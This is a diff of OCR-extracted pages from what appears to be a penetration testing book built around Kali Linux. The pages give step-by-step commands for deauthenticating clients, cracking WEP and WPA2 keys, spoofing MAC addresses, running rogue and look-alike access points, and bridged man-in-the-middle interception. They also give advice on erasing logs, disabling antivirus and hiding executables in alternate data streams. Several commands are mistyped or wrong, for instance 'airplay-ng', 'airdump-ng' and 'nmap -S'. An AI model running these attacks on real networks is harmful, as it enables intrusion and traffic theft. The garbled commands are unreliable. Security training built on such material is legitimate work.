+    \ Prediction\n  * TCP Window Size overflow\n  * Syn attacks\n  * Gateway redirection\n\
+    \  * DNS poisoning\n  * High volume traffic attacks (ping of death, smurf, teardrop)\n\
+    \n+   * Application vulnerabilities\n\n+   * Applications usually have holes as\
+    \ a result of poor coding and testing practices\n* Each application will provide\
+    \ a unique method of attack\n* Examples include:\n  * Buffer overflows\n  * Weak\
+    \ authentication mechanisms\n  * Poor Data validation\n  * Written with errors\n\
+    \n+   * Vulnerabilities Assessment\n\n+   * Nessus is most Common open source\
+    \ software\n* Some useful Resources:\n  * OVAL - Standardized assessment\n  *\
+    \ FrSIRT - French Security Incident Response Team\n  * US-Cert - United States\
+    \ Security Incident Response Team\n  * AusCert - Australia Security Incident Response\
+    \ Team\n  * Web Posting of Exploits"
+  merge: -1
+  pgno: 31
+- img_proc: true
+  md: "# Step 6 - Penetration, Access, and Compromise\n\n+   * Actual attack starts\n\
+    \  * At this step the goal is to gain the highest level of permissions or rights\
+    \ on the system\n  * Use undiscovered techniques and methods\n  * Exploits that\
+    \ enable penetration include:\n    * Buffer overflow\n    * Stack exploits\n \
+    \   * Web vulnerabilities\n    * Services/apps that allow unauthenticated access\n\
+    \    * SQL Injection\n    * Application error handling\n    * Directly Traversal\n\
+    \    * Malformed Packets\n\n+   * Bypassing Access Controls\n  * What are common\
+    \ types of access controls?\n    * Username/passwords combinations\n    * Tokens\n\
+    \    * Smart cards\n    * Biometric access methods\n\n+   * Password cracking\
+    \ is most common means of accessing systems\n  * Social Engineering can be used\
+    \ to con people out of access information\n  * Sniffers take passwords right of\
+    \ the wire\n  * Session Hijacking enable impersonation\n  * Application/Service\
+    \ Accounts\n  * Group Membership\n  * Incorrectly configured permissions\n\n+\
+    \   * Password Cracking\n  * Username/Password is the most insecure method pf\
+    \ authentication\n  * Usernames can easily be discovered (naming conventions,\
+    \ email add, etc.)\n  * Passwords usually must be cracked"
+  merge: -1
+  pgno: 32
+- img_proc: true
+  md: '+   * There are several ways to crack a password:
+
+    * Brute Force Attack
+
+    * Dictionary Attack
+
+    * Hybrid Attack
+
+    * Sniffing wire - Plaintext or encrypted hashes
+
+    * Some good applications at www.oxid.it
+
+
+    +   * Social Engineering
+
+    * Social engineering is the art of manipulating people to get information from
+    them or persuade them to do your will
+
+    * Can occur in person, over phone, over email or chat
+
+    * It is a very low-technology method
+
+    * Usually employed to get information like user id, pass, domain, server address,
+    etc.
+
+    * Can be used by person to perform action (unlock door, allow physical access
+    of unauthorized person, reset password, etc.)
+
+    * Methods include:
+
+    ○ Posing as important user and using pressure to get information
+
+    ○ Posing as tech support/helpdesk representative
+
+    ○ Pretending to be authorize by a third party (manager, boss, etc.)
+
+    ○ Dumpster diving: Getting information from sensitive information not properly
+    disposed of -thrown in the trash
+
+    ○ Shoulder surfing: Observing another person login to system and get the details
+
+
+    +   * Session Hijacking
+
+    * This is the technique of becoming Man-in-the-middle and taking over the session
+
+    * It involves intercepting, monitoring, and recording session between computers
+
+    * It is used to intercept login credentials
+
+    * Used to take over session between server and client, impersonating each to the
+    other
+
+    * Data can be intercepted, modified and retransmitted to destination host
+
+
+    +   * Privilege Escalation'
+  merge: -1
+  pgno: 33
+- img_proc: true
+  md: "+   - Access to a system normally starts as normal user or guest and need elevated\
+    \ privileges to complete the attack\n- Examples are buffer/stack overflows to\
+    \ achieve admin access\n- Using social engineering to use admin privileges (phishing,\
+    \ emails, call people and tell them you from 'helpdesk' and ask for information)\n\
+    - May be to capture admin account and password using keystroke loggers\n- May\
+    \ be to boot off Linux-based password change disk and change administrator’s password\
+    \ to blank or desired password (Requires physical access to box)\n\n+   - Maintaining\
+    \ and Expanding access\n  - Once obtained, it must be maintained\n  - Must prevent\
+    \ detection or loss of access\n  - There are several methods to maintain access:\n\
+    \    - Rootkits, OS exploits, caching credentials, prevent logging, etc.\n   \
+    \ - Install Trojans that protect or continue access through backdoor methods\n\
+    \    - Create new accounts or elevate privileges of other accounts\n    - Change\
+    \ permissions on shares and files\n    - Enable null sessions (Windows boxes)\n\
+    \n+   - Expanding access allows other hosts to be compromised from already hacked\n\
+    - Transfer hacker tools to hacked host\n- Use built-in commands on host to further\
+    \ footprint other hosts on network\n- Obtain other protected passwords to other\
+    \ systems from host you have hacked\n- Obtain hosts domain server, DNS servers,\
+    \ DHCP server and other useful services by looking at TCP/IP info\n- Enumerate\
+    \ entire domain from hacked host\n\n+   - System Compromise\n  - System compromise\
+    \ is achieved when your initial goal is met\n    - Root access\n    - Data Access/Theft"
+  merge: -1
+  pgno: 34
+- img_proc: true
+  md: '+   - Denial of Service
+
+    - Rootkit/File replacement
+
+    - File Upload
+
+    - As a result there will be an open door with the possibility of further access
+    to other boxes'
+  merge: -1
+  pgno: 35
+- img_proc: true
+  md: "# Step 7 - Evading Defences and Erasing Tracks\n\n+   - Where are your actions\
+    \ recorded?\n  - Log Files\n  - File Access times\n  - Windows Registry entries\n\
+    \  - Hacker tools left behind\n  - Operating system performance stats\n  - IDS\n\
+    \  - Proxy Servers\n  - Firewalls\n\n+   - Deleting files and other evidence\n\
+    \  - There are number of places you should look into to make sure you won't leave\
+    \ any evidence behind\n  - Windows security event logs, web logs, firewall and\
+    \ IDS\n  - Application logs\n  - Log files usually require admin access and will\
+    \ log the deletion itself\n  - Delete traces of tools used to hack box\n  - Avoid\
+    \ replacing key system files if possible\n  - Some files/logs may have to be deleted\
+    \ automatically with reboot-page file\n  - Registry entries can contain evidence\
+    \ of attack - keep track of keys modified and reset or delete later if possible\n\
+    \  - Antivirus software can detect Trojans and other malware - disable if possible\n\
+    \  - Know what traces your tools leave behind\n\n+   - Rootkits\n  - Rootkits\
+    \ are used to maintain access and prevent logging of actions\n  - They are set\
+    \ of tools used by an attacker after gaining root-level access to host\n  - It\
+    \ replaces system files with Trojaned ones\n  - Files look and behave exactly\
+    \ like originals\n  - Can be common utilities like notepad, calculator, etc."
+  merge: -1
+  pgno: 36
+- img_proc: true
+  md: "+   ○ Will normally perform normal ‘looking’ functions, but hide other activities\n\
+    \n+   ○ One example is rooted ‘netstat’ command that lists all connections except\
+    \ yours\n\n+   • Steganography\n  ○ This is the act of hiding files in other files\n\
+    \  ○ Viruses, rootkits and Trojans can be hidden in other harmless files\n  ○\
+    \ It is common to hide files in media files (jpeg)\n  ○ Alternate Data Streams\
+    \ (NTFS Streams) is a very popular hiding technique in Windows\n  ○ They are very\
+    \ difficult to detect\n  ○ Hacker tools and other malware can be hidden using\
+    \ steganography tools\n  ○ Example on Microsoft Windows using smbrelay2.exe application:\n\
+    \    ■ Md5sum doc.doc > sum.txt - MD5 for doc.doc\n    ■ Type smbrelay2.exe >\
+    \ doc.doc:smb.exe - This will hide the smb exe inside doc.doc\n    ■ Md5sum doc.doc\
+    \ > sum2.txt - New MD5 is the same as the old one\n    ■ Start \\doc.doc:smb.exe\
+    \ - You can run the hidden file this way\n    ■ Type dnsenum.txt > doc.doc:dns.txt\
+    \ - Add another text file to the current doc file\n    ■ Md5sum doc.doc > sum3.txt\
+    \ - New MD5 is the same as the old one\n    ■ Notepad doc.doc:dns.txt\n\n+   •\
+    \ Evading IDS and Firewalls\n  ○ It requires advanced techniques to evade intrusion\
+    \ detection/logging devices\n  ○ Use stealth stealth when using port scanner\n\
+    \  ○ Use slow/random scanning techniques so traffic goes unnoticed - This can\
+    \ take a long time\n  ○ Use out of band techniques when possible\n  ○ War dialing\
+    \ can detect modern systems attached to systems within network, allowing dial-in\
+    \ and bypassing network perimeter defence\n  ○ Use specially crafted packets to\
+    \ bypass firewalls and avoid triggering IDS alarms"
+  merge: -1
+  pgno: 37
+- img_proc: true
+  md: "# Introduction to Hacking Techniques\n\n+   * Buffer Overflows\n  * This type\
+    \ of vulnerability usually associated with both programs and Operating Systems\
+    \ and caused by sloppy programming\n  * They are based upon practice of not defining\
+    \ boundaries on buffers or variables\n  * Allow excessive or out-of-bounds data\
+    \ to be inserted into program buffer\n  * Enables insertion of malicious code\
+    \ or execution of arbitrary commands as user\n  * Can cause programs to freeze\
+    \ or lock up\n  * Can cause machine to crash or permit exploit leading to compromise\n\
+    \  * Skills needed to exploit buffer overflows:\n    * Good programming skills\n\
+    \    * Knowledge of stack vulnerabilities\n    * Ability to research, analyse\
+    \ and apply vulnerabilities and exploits to current attack\n  * Countering buffer\
+    \ overflows:\n    * Ensure programmers work with security mindset\n    * Security\
+    \ test programs for vulnerabilities before release\n* Sniffers\n  * Sniffer is\
+    \ usually a device or host that enables computer to pick ALL traffic (sniff) on\
+    \ wire, even if it does not originate or is destined for host\n  * Used to eavesdrop\
+    \ on network traffic\n  * Enables attacker to pick up plaintext data, user credential,\
+    \ etc.\n  * Usually requires physical connection into network (except wireless)\n\
+    \  * Can be hardware device or software installed on computer\n  * Puts network\
+    \ card into promiscuous mode\n  * Records captured traffic for analysis and playback\n\
+    \  * Popular sniffers:\n    * Wireshark"
+  merge: -1
+  pgno: 38
+- img_proc: true
+  md: "+   * Etherape\n* Ettercap\n* Microsoft Network Monitor\n* Windows sniffers\
+    \ must have specialized protocol driver installed on computer (Winpccap)\n\n+\
+    \   * Wireless Hacking\n* This is relatively new form of hacking\n* Takes advantage\
+    \ of weak encryption protocols and security in wireless standards\n* Unique in\
+    \ that hacker can become a physical node on your network and bypass firewall and\
+    \ other premise protection\n* Easy to set up but not frequently secured\n* Wireless\
+    \ networks use a few different forms of encryption\n    * WEP (Wired Equivalency\
+    \ Privacy)\n    * WEP uses 40, 64, or 128 bit keys\n    * Weakness is in short\
+    \ initialization vector with static key - sniffing traffic for a few hours will\
+    \ get you the key\n    * Largely replaced by WPA and WPA2\n    * WPA (WiFi Protected\
+    \ Access)\n    * WPA2\n* Wireless networks discovered through war driving - Literally\
+    \ driving and seeking networks with laptop acting as sniffer\n* Popular war driving\
+    \ software includes Netstumberbler, Airsnort, Airopeak, Kismet\n* Once wireless\
+    \ network is discovered, traffic is sniffed to gather enough information to capture\
+    \ WEP key\n* Attacker often spoofs trusted MAC address to get around MAC filtering\n\
+    * Once in, attacker can compromise the network\n* Wireless is susceptible to wide\
+    \ variety of attacks like:\n    * DoS\n    * Data theft\n    * Illegal access\n\
+    \n+   * SQL Injection"
+  merge: -1
+  pgno: 39
+- img_proc: true
+  md: '+   - This is a type of attack on company’s valuable database assets - personal
+    data, financial data, etc.
+
+    - Relies on poor data validation and statement checking in application interface
+    with databases, usually MSSQL
+
+    - Utilizes the ability to modify or append SQL statements that are sent to the
+    database
+
+    - Can often circumvent authentication or restrictions placed on applications
+
+    - Most commonly affects web servers with back end SQL ansi92 enabled databases
+
+    - Only data validation checks and query restrictions can prevent SQL Injection
+
+    - Some database configuration can help, but application is the weak point
+
+
+    +   - Rootkits
+
+
+    +   - Rootkits are malicious programs that replace OS executables
+
+    - They are used to maintain and hide illicit access
+
+    - Usually require root access to install
+
+    - Linux rootkits are plentiful on Internet
+
+    - Few detection methods available
+
+    - MD5sum of files based on baseline is one way, but logistically difficult to
+    manage due to legitimate frequent changes on systems
+
+    - Very difficult to eliminate rootkits
+
+    - Best way is to rebuild the box with known good software
+
+    - Disadvantage is rebuilding the box eliminates evidence of rootkit that may be
+    needed in investigation/prosecution
+
+
+    +   - Spoofing
+
+
+    +   - This is the technique used to hide identity of traffic originator or assume
+    identity of trusted entity
+
+    - IP addresses, MAC addresses, emails are routinely spoofed
+
+    - Prevent attackers from being easily traced
+
+    - Usually relies on weaknesses of TCP/IP itself or applications
+
+    - Some mechanisms in place can prevent spoofing (blocking internal address space
+    from entering firewall through external interface, for example)
+
+    - Spoofing methods and tools depend on platform and architecture'
+  merge: -1
+  pgno: 40
+- img_proc: true
+  md: "+   - Denial of Service (DoS) attacks\n  - These types of attacks are used\
+    \ to prevent legitimate users of system from using it\n  - May become primary\
+    \ goal of attacker if penetration attempts have failed\n  - Does not require a\
+    \ lot of skill or experience to implement\n  - Many methods/levels of DoS attacks\
+    \ exist:\n    - TCP clack: Ping of Death, Window size overflow, Smurf, Teardrop\
+    \ attacks\n    - User access: intentionally locking users out of services\n  \
+    \  - Halting services that apps depend upon\n    - Large scale DoS attacks use\
+    \ multiple hosts\n    - Called Distributed DoS attack\n  - Uses unspecting/unsecured\
+    \ hosts to mount multi-system attack on target (zombies)\n\n+   - Web hacking\n\
+    \  - Attacks against web sites or servers are most popular attacks\n  - They are\
+    \ easier due to to proximity of target to Internet\n  - Unsecure coding and failure\
+    \ to lockdown servers make them easy targets\n  - Most servers are behind firewall\
+    \ but traffic is allowed through necessity\n  - First step is to enumerate services/apps\
+    \ on target, determine what web software is running\n  - Try known exploits against\
+    \ identified web server (IIS, Apache, etc.)\n  - Use exploits that achieve specific\
+    \ goal (DoS) of site, site defacement or modification\n  - May also be able to\
+    \ intercept/modify data through attack\n  - Web server attack may lead to deeper\
+    \ penetration of network (backend database servers, etc.)\n  - Popular attacks\
+    \ include:\n    - Cross-site scripting\n    - IIS DDL vulnerabilities\n    - Directory\
+    \ Traversal\n    - Unicode Attacks"
+  merge: -1
+  pgno: 41
+- img_proc: true
+  md: "# Popular Hacking Tools\n\n+   * Nmap\n  * It is the most popular multifunctional\
+    \ tool\n  * Versions available for both Windows and Linux, Linux command version\
+    \ is better\n  * Functions as a ping, port, service scanner - Can identify OS\n\
+    \  * Very useful during initial stages of attack to find hosts and enumerate their\
+    \ services\n  * Simple to use command like features series of switches that dictate\
+    \ which type of scan target\n  * Examples:\n    * nmap -S 192.168.66.132 >> syn.txt\
+    \ --- TCP syn scan, quick and quiet\n    * nmap -T 192.168.66.132 >> syn.txt --\
+    \ TCP scan - can be detected by IDS\n    * nmap -sU 192.168.66.132 >> udp.txt\
+    \ - UDP scan\n    * nmap -sM 192.168.66.132 >> bsd.txt --- TCP stack scan on BSD\
+    \ operating system\n    * nmap -sA 192.168.66.13 >> ack.txt -- Ack scan to enumerate\
+    \ firewalls rule set\n    * nmap -sN 192.168.66.1 >> linux.txt - Linux Null scan,\
+    \ if packet doesn't contain ack, syn ack, it will return null if close and no\
+    \ response open\n    * nmap -sF 192.168.66.1 >> linux.txt - Fin scan - Fin flag\
+    \ is on\n    * nmap -sX 192.168.66.1 >> linux.txt - Xmas scan\n    * nmap -scanflags\
+    \ URG 192.168.66.1 >> urg.txt\n    * nmap - scanflags URGST 192.168.66.1 >> linux.txt\n\
+    \n+   * Superscan\n  * It is a Windows-based tool with almost same functionality\
+    \ as nmap\n  * Developed by Foundation Inc\n  * Now owned by McAfee\n  * Easy\
+    \ to use the GUI interface\n  * Has other functions including network lookup,\
+    \ whois, etc.\n\n+   * Nessus"
+  merge: -1
+  pgno: 42
+- img_proc: true
+  md: '+   ○ Most popular network vulnerability scanner
+
+    ○ Open source with commercial version available
+
+    ○ Web management interface
+
+    ○ Uses modular databases of current exploits for all types of OSes and apps
+
+    ○ Databases called Plugins
+
+    ○ Hundreds of plugins exist and are updated daily to include latest exploits
+
+    ○ Requires higher level of knowledge to effectively use tool
+
+    ○ Has its own scripting language (NASL) used to custom-write exploit scans
+
+
+    +   * Kali Linux
+
+
+    +   ○ Kali Linux is a Debian-derived Linux distribution designed for digital forensics
+    and penetration testing. It is maintained and funded by Offensive Security Ltd.
+    It was developed by Mati Aharoni and Devon Kearns of Offensive Security through
+    the rewrite of BackTrack, their previous forensics Linux distribution.
+
+    ○ We will show you how to use some of Kali’s features and tools later on this
+    book.'
+  merge: -1
+  pgno: 43
+- img_proc: true
+  md: '# Ethical Hacking and Penetration Certifications
+
+
+    +   * The Certified Ethical Hacker (CEH) Exam
+
+    * The Certified Penetration Testing Specialist Exam
+
+    * The OSSTMM Professional Security Tester'
+  merge: -1
+  pgno: 44
+- img_proc: true
+  md: '# Penetration Testing with Kali Linux
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_45_0.png)'
+  merge: -1
+  pgno: 45
+- img_proc: true
+  md: '# Penetration testing and Digital Forensics Tool kit
+
+
+    Kali Linux is one of the best penetration testing tool which contains tools
+
+    for
+
+
+    +   * Vulnerability assessment
+
+    * Information gathering
+
+    * Forensics
+
+    * Reverse engineering
+
+    * Exploitation tools
+
+    * Privilege escalation
+
+    * Wireless tools
+
+    * Many others as well'
+  merge: -1
+  pgno: 46
+- img_proc: true
+  md: "# Kali Linux Installation and usage\n\nThere are different ways of using Kali\
+    \ Linux. Whether you choose to install it on local disk or use the live distributions\
+    \ the options are available.\n\n+   * Live CD\n    You can load Kali Linux from\
+    \ a bootable CD/DVD without any need to install it. This will be a live version\
+    \ of Kali and has all the features and tools.\n* Live USB\n    You can install\
+    \ Kali Linux on a USB disk and use that to load Kali. This will be very handy\
+    \ when you want to have a portable version and be able to take it anywhere with\
+    \ you.\n* Installed to disk\n    This is a normal and basic installation of Kali\
+    \ Linux which is very similar to a Linux distributions installation. You need\
+    \ to follow the prompts and get the installation completed. We will explain this\
+    \ later in this book."
+  merge: -1
+  pgno: 47
+- img_proc: true
+  md: '# Installing on Virtual machine
+
+
+    Once the installation is completed you need to setting up the IP address and basic
+    configuration like SSH, Gateway, DNS, etc.
+
+
+    It is always recommended to update your environment with the below commands to
+    have all the latest software and tools installed.
+
+
+    First command is “apt-get update” which will update the database and make your
+    operating system ready for the next step.
+
+
+    Second step is to run ”apt-get upgrade” command which will perform an upgrade
+    on all packages and software available on Kali. This process might take a while.
+
+
+    For complete installation steps guide, please refer to the last section of this
+    book.'
+  merge: -1
+  pgno: 48
+- img_proc: true
+  md: '# Wireless Penetration
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_49_0.png)
+
+
+    Wireless networks are an extension of your organisation’s infrastructure perimeter
+    and should be tested thoroughly. An insecure wireless network opens up your organisation
+    to the external world and poses a security risk. Rogue access points, installed
+    by employees on the infrastructure, which do not follow the organisation’s security
+    guidelines, can also be used to compromise your organisation.
+
+
+    There are different ways of securing a wireless network but none is enough to
+    prevent an attacker from penetration. On the next couple of sections we will show
+    you how to do some penetration testing on wireless networks and how easy it is
+    to bypass the available security on the wireless devices. First we start with
+    setting up the wireless adapter for Kali.'
+  merge: -1
+  pgno: 49
+- img_proc: true
+  md: '# Wireless Transmission Power adjustment
+
+
+    The first step which needs to be done when you start working on a wireless penetration
+    project is to adjust your wireless interface configuration based on the country
+    and environment. Different countries have different transmission power levels
+    and codes. Below, there is an example of how you can adjust your wireless interface
+    card settings in US. We will configure the below parameters on the interface card:
+
+
+    +   * TX power levels (set in dBm)
+
+    * Configuring Country code
+
+    * Configuring the level
+
+
+    Commands we will use to change the wireless configuration are “iw” and “iwconfig”
+
+
+    ```
+
+    ifconfig wlan0 down -- To turn off the wireless
+
+    iw reg set US -- To set the country to US
+
+    iwconfig -- To check wireless configuration
+
+    iwconfig wlan0 txpower 27 -- To change the transmit power to 27 dBm (Based on
+    the country code the maximum transmit power is different)
+
+    iwconfig wlan0 -- To check the wireless interface configuration
+
+    ifconfig wlan0 up -- Brings up the wireless interface
+
+    ```
+
+
+    Once we have done all the above steps we should be ready to start the first wireless
+    project.'
+  merge: -1
+  pgno: 50
+- img_proc: true
+  md: '# Discovering an AP which is hiding its SSID
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_51_0.png)
+
+
+    When a wireless access point is configured, it can be set up to advertise its
+    SSID (Access Point name) or hide it. It is easy to initiate an attack on an access
+    point which is advertising its ID as we know the name. However; it is not so difficult
+    to find the ID of an access point which is hidden. To find the SSID of an AP which
+    is hidden you need to follow the below steps:
+
+
+    +   - Start wireless monitoring with “airmon-ng” command. This will create a monitor
+    interface called “mon0"
+
+    - Discover the Aps with the “airodump-ng” command
+
+    - At this stage you can wait for association of a client with the hidden AP and
+    it will show the SSID. However; this might take some time and you can use airplay-ng
+    to make it faster.
+
+    - Below steps show how you can find the SSID name of an AP which is hidden:
+
+
+    ```
+
+    airmon-ng start wlan0 -- To create the monitoring interfaceairmon-ng -- To show
+    and verify the interfaces and started service (mon0 and wlan0)
+
+    airodump-ng mon0 -- Starts monitoring interface - Hidden wireless comes up with
+    <Length: 0> . After a while it will show the SSID when devices associate with
+    it
+
+    airodump-ng -c 1 mon0 -- This will only listen for channel 1
+
+    to find the SSID without waiting, copy the MAC address of the AP from the step
+    above and follow the below steps:
+
+    airplay-ng -0 2 -a 00:1B:11:60:17:3F mon0 -- This is basically a Deauth attack
+    (-0 is deauth and 2 means twice)
+
+    ```'
+  merge: -1
+  pgno: 51
+- img_proc: true
+  md: +   * After the Deuth attack the SSID will come up on airodump-ng output above
+    as the clients will try to authenticate again
+  merge: -1
+  pgno: 52
+- img_proc: true
+  md: "# Bypassing MAC address filtering on Wireless\n\n![](img/c6b688dca6570d17db3036b560ef0905_53_0.png)\n\
+    \nSome Wireless Access Points might have another level of security which is MAC\
+    \ address filtering. Although this is a good practice to have this filter in place\
+    \ but it is not so difficult to crack it.\n\n+   Steps you need to follow to bypass\
+    \ Mac address filtering\n    * Find the AP as explained in previous section using\
+    \ airomon-ng & airodump-ng commands\n    * Find an associated client using airodump-ng\
+    \ command\n    * Borrow the MAC address using macchanger\n\n+   Commands for the\
+    \ above steps\n    * airomon-ng start wlan0\n    * airodump-ng mon0\n    * iwconfig0\
+    \ SSID Sneaky-SSID channel 4 -- To associate with Sneaky-SSID wireless\n    *\
+    \ iwconfig wlan0 -- To check if the association is successful, which won't be\
+    \ if there is a MAC filtering\n    * airodump-ng -c 4 -ssid 00:1B:11:60:17:3F\
+    \ mon0 -- Only shows channel 4 and the bssid of AP and only show the associated\
+    \ clients with that AP (-a)"
+  merge: -1
+  pgno: 53
+- img_proc: true
+  md: '+   - The output of the above command will show the station MAC address which
+    is associated with the AP and you can use that MAC address
+
+    - airmon-ng stop wlan0
+
+    - macchanger -m 58:55:CA:F2:6F:Af wlan0 -- This will replace the wlan0 MAC address
+    to a different one
+
+    - ifconfig wlan0 down
+
+    - ifconfig wlan0 up
+
+    - iwconfig wlan0 ssid Sneaky-SSID channel 4'
+  merge: -1
+  pgno: 54
+- img_proc: true
+  md: "# Breaking Wireless WEP passwords\n\n![](img/c6b688dca6570d17db3036b560ef0905_55_0.png)\n\
+    \nWEP passwords are the most insecure passwords on wireless devices. Follow the\
+    \ below steps to crack a WEP wireless password.\n\n+   * airmon-ng -- To find\
+    \ the wireless card name\n* airmon-ng stop [wireless card name]\n* airmon-ng start\
+    \ [wireless card name] -- will create monitoring of the wireless interface\n*\
+    \ airmon-ng -- To see and check the changes\n* airodump-ng [monitor interface\
+    \ name] -- To find the channel and bssid and essid\n* write down channel, bssid,\
+    \ essid and then on terminal #1 run:\n    * airdump-ng -w weep -c [channel number]\
+    \ --ssid [bssid] [wireless card name]\n    * This will link your wireless card\
+    \ to that particular connection\n* On a new terminal #2 type:\n    * airplay-ng\
+    \ -1 0 -a [bssid] [wireless card name]\n    * This will associate your wireless\
+    \ card with the connection so you can transfer data\n* On a new terminal #3 run:\n\
+    \    * airplay-ng -3 -b [bssid] [wireless card name]\n    * This will start send/receive\
+    \ data on the connection"
+  merge: -1
+  pgno: 55
+- img_proc: true
+  md: "+   * Bring the first terminal #1 and leave it running until data > 30,000\
+    \ then press Ctrl+C and run \"dir *.cap\"\n* Use the filename output of the above\
+    \ command and run:\n  * aircrack-ng [filename].cap\n  * This will give you the\
+    \ WEP password!"
+  merge: -1
+  pgno: 56
+- img_proc: true
+  md: '# Breaking Wireless WPA2
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_57_0.png)
+
+
+    There are number different security encryption and protocol on wireless access
+    point like WEP, WPA and WPA2. WEP and WPA are easy to crack and there are number
+    of online resources about how to hack a WEP or WPA on wireless devices. WPA2 are
+    more secure and if a strong password is used, they are very difficult to crack.
+    However; there are also ways to crack WPA2 passwords.
+
+
+    To crack a WPA2 password follow the below steps.
+
+
+    +   * airmon-ng wlan0 -- It will start the logical mon0 interface
+
+    * iwconfig -- To verify the configuration
+
+    * airodump-ng mon0
+
+    * airodump-ng -w OUTFILE -c 1 -bssid 58:6D:8F:A0:16:11 mon0 --w to write output
+    to file
+
+    * airplay-ng -0 0 -a 58:6D:8F:A0:16:11 mon0 -- Run while airodump-ng command is
+    running to initiate a deauthentication so you can get the hash passwords on the
+    file
+
+    * aircrack-ng OUTFILE-01.cap -w /usr/share/passwords/wordlists/darkc0de.lst --
+    Initiate a password attack to the wireless (Brute Force/Dictionary Attack)'
+  merge: -1
+  pgno: 57
+- img_proc: true
+  md: "# Rogue Access Point\n\n![](img/c6b688dca6570d17db3036b560ef0905_58_0.png)\n\
+    \nOne of the common ways of wireless attacks is to set up a fake access points\
+    \ and get others to authenticate on it. This can be done in Companies, airports,\
+    \ coffee shops, etc.\n\nAs an example, imagine you are in an airport trying to\
+    \ connect to a free WIFI and you see an Access Point called Free-Airport. This\
+    \ could be the attacker and not actually the airport service.\n\n+   - To set\
+    \ up a Rogue access point follow the below steps:\n- Install and configure a DHCP\
+    \ server:\n  - apt-get install dhcp3-server -y\n  - mv /etc/dhcp3/dhcppd.conf\
+    \ /etc/dhcp3/dhcppd.conf.backup\n  - nano /etc/dhcp3/dhcppd.conf\n    - ddns-update-style\
+    \ ad-hoc;\n    - default-lease-time 600;\n    - max-lease-time 7200;\n    - subnet\
+    \ 192.168.2.0 netmask 255.255.255.0 {\n    - option subnet-mask 255.255.255.0;"
+  merge: -1
+  pgno: 58
+- img_proc: true
+  md: "+   - option broadcast-address 192.168.2.55;\n- option routers 192.168.2.1;\
+    \ - Our IP address\n- option domain-name-servers 8.8.8.8;\n- range 192.168.2.51\
+    \ 192.168.2.100;\n\n+   - Set up your wireless device as an access point (in other\
+    \ terminology a hot spot).\n\n+     - airmon-ng start wlan0\n  - airdump-ng --essid\
+    \ mon0 -- just to look who else is out there starting advertising SSID\n  - airbase-ng\
+    \ --essid \"Free Hotspot\"-c 6 mono -- This will convert your computer to an AP\
+    \ with Free Hotspot SSID and give you a new interface name for AP\n\n+   - Set\
+    \ up the IP addressing and services\n\n+     - ifconfig at0 192.168.2.1/24\n \
+    \ - route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1\n  - dhcp3\
+    \ -cf /etc/dhcp3/dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid at0\n  - /etc/init.d/dhcp3-server\
+    \ start\n\n+   - Disable firewalls and enable routing to give the victims internet\
+    \ connectivity\n\n+     - iptables -flush\n  - iptables -table nat -flush\n  -\
+    \ iptables -delete-chain\n  - iptables -table nat -append POSTROUTING -out-interface\
+    \ eth0 -j MASQUERADE\n  - iptables -append FORWARD -in-interface at0 -j ACCEPT\n\
+    \  - echo 1 > /proc/sys/net/ipv4/ip_forward\n\n+   - Once client connects you\
+    \ can see that on the output of airbase-ng command which is running"
+  merge: -1
+  pgno: 59
+- img_proc: true
+  md: '# Mis-Association attacks on wireless
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_60_0.png)
+
+
+    The technique of mis-association attack is to get a computer connect to your Kali
+    machine using one of the old Wirelesses that it has connected before. Or use the
+    same SSID name as is available and has some clients. For example, if a computer
+    was connected to the WIFI network called “Public-wifi” in the past, that name
+    will be discovered and used to attack to the host.
+
+
+    The steps are as below:
+
+
+    +   * Find one of the wireless SSID names that the victim has connected before
+    using “airodump-ng"
+
+    * Set up a new access point with exactly the same name
+
+    * Send a de-auth message to the victim to it will be disconnected from the current
+    AP and try to connect again
+
+    * As the SSID you created is already on the victim’s list, it will be connected
+    to your created AP.
+
+    * You can start capture victim’s traffic!'
+  merge: -1
+  pgno: 60
+- img_proc: true
+  md: "To achieve this below steps need to be followed:\n\n+   * airmon-ng start wlan0\n\
+    * airodump-ng mon0 -- -- You can see the station is trying to connect to a list\
+    \ of Aps that it has connected before (probe column) - e.g Publicwifi\n  * Note:\
+    \ make sure that SSID is not available on the current list of APs\n* airbase-ng\
+    \ -essid “Public-wifi” -c 1 mon0 -- This will make Kali an access point and client\
+    \ can authenticate and connect\n* Set up DHCP and other setting as per previous\
+    \ section (Rogue access points)\n* Now the client station will try to connect\
+    \ to your computer as it has the same SSID on its database\n* If client machine\
+    \ is already connected to another WIFI, start a de-auth attach as below\n* aireplay-ng\
+    \ -0 0 -a 22:AF:3A:5E:22:3D mon0 -- Force clients to reauthenticate and connect\
+    \ to our machine\n* Monitor the output of airbase-ng command to see when the victim\
+    \ connects"
+  merge: -1
+  pgno: 61
+- img_proc: true
+  md: "# Wireless Man in the middle attack using bridging\n\n![](img/c6b688dca6570d17db3036b560ef0905_62_0.png)\n\
+    \nOne of the common attacks on wireless networks is the Man In The Middle (MIDM)\
+    \ attack. To achieve this you need to set up your Kali as an access point and\
+    \ its network cards in bridge mode, so client won't notice any change. Once the\
+    \ client is connected to your device and you use the network as normal, sniffers\
+    \ like Wireshark can be used to capture its traffic.\n\n+   * Use the above steps\
+    \ to create an AP with airmon-ng, airodump-ng and airbase-ng\n* Commands to achieve\
+    \ this as below:\n  * ifconfig - verify the hardware\n  * Set up the access point\
+    \ on your wireless interface\n    * airmon-ng start wlan0\n    * airodump-ng mon0\n\
+    \    * airbase-ng -essid “Corporate-WIFI” -c 1 mon0\n* Set up the bridge interface\
+    \ for between at0 and eth0 called BR1"
+  merge: -1
+  pgno: 62
+- img_proc: true
+  md: "+   * ifconfig at0\n* brctl addbr BR1\n* brctl addif BR1 eth0\n* brctl addif\
+    \ BR1 at0\n* brctl show\n* ifconfig eth0 0.0.0.0 up\n* ifconfig at0 0.0.0.0 up\n\
+    * ifconfig BR1 192.168.1.205/24 up\n* Test and enable IP forwarding\n  * ping\
+    \ 192.168.1.1\n  * echo 1 >/proc/sys/net/ipv4/ip_forward"
+  merge: -1
+  pgno: 63
+- img_proc: true
+  md: "# Nmap - Free Security Scanner\n\n![](img/c6b688dca6570d17db3036b560ef0905_64_0.png)\n\
+    \nNmap is one of the best and most popular scanning tools which can be used post\
